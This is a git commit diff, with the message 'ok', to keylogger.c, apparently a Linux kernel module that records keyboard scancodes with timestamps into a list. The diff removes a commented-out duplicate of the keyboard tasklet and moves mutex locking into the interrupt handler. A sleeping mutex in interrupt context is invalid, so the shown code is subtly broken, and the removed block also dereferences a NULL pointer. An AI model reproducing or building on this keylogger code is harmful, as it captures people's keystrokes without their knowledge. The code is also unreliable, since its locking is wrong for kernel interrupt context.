626679d0b3b71f0b9439fcab741975db207bafdd
6L45 <silas.dbr170@gmail.com>
2024-03-18 18:28:55 +0100

    ok

--- keylogger.c
+++ keylogger.c
@@ -1,44 +1,4 @@
 #include "keylogger.h"
-/*
-static void keyboard_tasklet(struct tasklet_struct *tasklet)
-{
-	unsigned char			scancode;
-	struct key_display_format	*kdf = NULL;
-	ktime_t			tv;
-
-	scancode = inb(KEYBOARD_PORT);
-	unsigned char state = (scancode & RELEASED_MASK) ? 1 : 0;
-	memset(kdf, 0, sizeof(struct key_display_format));
-
-//	 
-	  * checking for the key we by the keycode received
-	  * faster to separate on state from the beginning
-	  * than checking each iteration : keycodes[i].released && keycodes[i].pressed
-//	  
-	int i = 0;
-	if (state) {
-		while (i < 86 && scancode != keycodes[i].released)
-			i++;
-	} else {
-		while (i < 86 && scancode != keycodes[i].pressed)
-			i++;
-	}
-
-	// unlikely, but better be safe than sorry
-	if (scancode != keycodes[i].pressed)
-		return;
-
-	// Alloc + assignation + add to list
-	if (!(kdf = kmalloc(sizeof(struct key_display_format), GFP_KERNEL)))
-		return;
-
-	do_settimeofday64(&tv);
-	time64_to_tm(tv.tv_sec, HOUR, &kdf->time);
-	memmove(kdf->key, keycodes[i].key, strlen(keycodes[i].key));
-	kdf->scancode = scancode;
-	kdf->state = state;
-}
-*/
 
 static void keyboard_tasklet(struct tasklet_struct *tasklet)
 {
@@ -83,15 +43,15 @@ static void keyboard_tasklet(struct tasklet_struct *tasklet)
 	kdf->scancode = scancode;
 	kdf->state = state;
 
-	mutex_lock(&tasklet_lock);
 	list_add_tail(&kdf->list, &keylist);
-	mutex_unlock(&tasklet_lock);
 }
 
 
 static irqreturn_t keyboard_interrupt(int irq, void *dev_id)
 {
+	mutex_lock(&tasklet_lock);
 	tasklet_schedule(&kbd_tasklet);
+	mutex_unlock(&tasklet_lock);
 
 	return IRQ_HANDLED;
 }
